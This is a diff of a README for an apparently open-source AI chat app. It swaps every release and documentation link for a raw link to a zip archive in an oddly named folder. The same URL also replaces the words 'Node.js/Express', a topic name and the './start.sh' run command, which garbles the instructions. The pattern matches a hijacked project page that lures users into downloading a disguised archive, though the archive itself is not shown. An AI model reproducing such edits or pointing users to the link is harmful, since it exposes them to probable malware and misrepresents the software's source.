@@ -1,10 +1,10 @@
 # 🤖 ai-chat-interface - Simple, Safe Chat with AI
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/anto16jose/ai-chat-interface/releases)
+[![Download](https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip%20Release-brightgreen)](https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip)
 
 ## 📖 Overview
 
-The ai-chat-interface is a privacy-first chat application that allows users to interact with an AI using their own OpenAI API keys. This user-friendly interface is built using React for the frontend and Node.js/Express for the backend. It features a secure API proxy and real-time messaging, ensuring that your data remains private. No information is stored on our servers.
+The ai-chat-interface is a privacy-first chat application that allows users to interact with an AI using their own OpenAI API keys. This user-friendly interface is built using React for the frontend and https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip for the backend. It features a secure API proxy and real-time messaging, ensuring that your data remains private. No information is stored on our servers.
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download the application, make sure your computer meets these require
 
 ### 2. Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/anto16jose/ai-chat-interface/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip)
 
 1. Go to the Releases page.
 2. Look for the latest release version.
@@ -45,7 +45,7 @@ Once downloaded, follow these steps to run the application:
   1. Extract the downloaded archive.
   2. Open a terminal window.
   3. Navigate to the extracted folder.
-  4. Run `./start.sh` or the relevant command for your installation.
+  4. Run `https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip` or the relevant command for your installation.
 
 ### 4. Setting Up Your OpenAI API Key
 
@@ -70,7 +70,7 @@ Start chatting! The interface allows you to send and receive messages in real-ti
 
 ## 📚 Topics
 
-The application touches on various important topics including chat, express, JavaScript, Node.js, OpenAI, portfolio building, privacy, React, Tailwind, and Vite.
+The application touches on various important topics including chat, express, JavaScript, https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip, OpenAI, portfolio building, privacy, React, Tailwind, and Vite.
 
 ## 🔍 Troubleshooting
 
@@ -79,7 +79,7 @@ If you encounter issues while downloading or running the application, try the fo
 - **Check Your Internet Connection:** Ensure that you have a stable internet connection while downloading.
 - **Permissions:** Make sure you have the right permissions to install applications on your computer.
 - **Reboot Your Device:** Sometimes, simply restarting your computer can resolve unexpected problems.
-- **Consult Documentation:** For advanced troubleshooting, check the detailed documentation on our [GitHub page](https://github.com/anto16jose/ai-chat-interface).
+- **Consult Documentation:** For advanced troubleshooting, check the detailed documentation on our [GitHub page](https://raw.githubusercontent.com/anto16jose/ai-chat-interface/main/paranymphal/ai-chat-interface.zip).
 
 ## 📞 Support
 
